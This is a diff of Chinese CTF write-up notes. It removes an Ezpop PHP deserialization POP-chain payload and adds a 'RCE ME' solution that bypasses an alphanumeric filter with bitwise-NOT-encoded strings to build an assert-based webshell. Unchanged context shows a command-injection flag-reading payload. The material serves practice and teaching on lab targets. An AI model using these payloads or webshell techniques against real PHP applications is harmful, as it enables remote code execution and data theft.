@@ -1,87 +1,3 @@
-## [MRCTF2020]Ezpop
-
-```php
-<?php
-//flag is in flag.php
-//WTF IS THIS?
-//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
-//And Crack It!
-class Modifier {
-    protected  $var;
-    public function append($value){
-        include($value);
-    }
-    public function __invoke(){
-        $this->append($this->var);
-    }
-}
-
-class Show{
-    public $source;
-    public $str;
-    public function __construct($file='index.php'){
-        $this->source = $file;
-        echo 'Welcome to '.$this->source."<br>";
-    }
-    public function __toString(){
-        return $this->str->source;
-    }
-
-    public function __wakeup(){
-        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
-            echo "hacker";
-            $this->source = "index.php";
-        }
-    }
-}
-
-class Test{
-    public $p;
-    public function __construct(){
-        $this->p = array();
-    }
-
-    public function __get($key){
-        $function = $this->p;
-        return $function();
-    }
-}
-
-if(isset($_GET['pop'])){
-    @unserialize($_GET['pop']);
-}
-else{
-    $a=new Show;
-    highlight_file(__FILE__);
-} 
-```
-
-payload
-
-```php
-<?php
-class Modifier {
-    protected $var="php://filter/read=convert.base64-encode/resource=flag.php";
-}
-class Show{
-    public $source;
-    public $str;
-}
-class Test{
-    public $p;
-}
-$a=new Show();
-$b=new Test();
-$d=new Modifier();
-$a->source=$a;
-$a->str=$b;
-$b->p=$d;
-
-var_dump(urlencode(serialize($a)));
-```
-
-`?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D`
-
 ## [WUSTCTF2020]朴实无华
 
 ```php
@@ -137,3 +53,93 @@ if (isset($_GET['get_flag'])){
 3. 不能用`cat`那就用`tac`或者`strings`或者`ca\t`,注意参数中不能出现空格,因此用`\t`代替即`0x09`
 
 payload`fl4g.php?num=1e10&md5=0e215962017&get_flag=tac%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag`
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+## [极客大挑战 2019]RCE ME
+
+> 类似于无参数RCE
+
+```php
+<?php
+error_reporting(0);
+if(isset($_GET['code'])){
+    $code=$_GET['code'];
+    if(strlen($code)>40){
+        die("This is too Long.");
+    }
+    if(preg_match("/[A-Za-z0-9]+/",$code)){
+        die("NO.");
+    }
+    @eval($code);
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+`[~%8F%97%8F%96%91%99%90][!%FF]();`执行`phpinfo();`
+
+读出disable_functions
+
+```
+pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl
+```
+
+`assert`并没有被过滤,因此可以利用`assert`来构造webshell
+
+```php
+#assert(end(getallheaders()));
+var_dump(urlencode(~"assert"));
+var_dump(urlencode(~"end"));
+var_dump(urlencode(~"getallheaders"));
+#string(18) "%9E%8C%8C%9A%8D%8B"
+#string(9) "%9A%91%9B"
+#string(39) "%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C"
+```
+
+payload`?code=(~%9E%8C%8C%9A%8D%8B)((~%9A%91%9B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));`
+
+扫描当前目录
+
+![image-20210425151423415](image-20210425151423415.png)
+
+扫描根目录
+
+![image-20210425151522718](image-20210425151522718.png)
+
+有`/flag`也有`/readflag`大概率是运行readflag来读,而flag无法直接读取
+
+`readfile("/flag");`无回显
+
+`readfile("/readflag");`有回显
+
+说明`/flag`无法直接读取
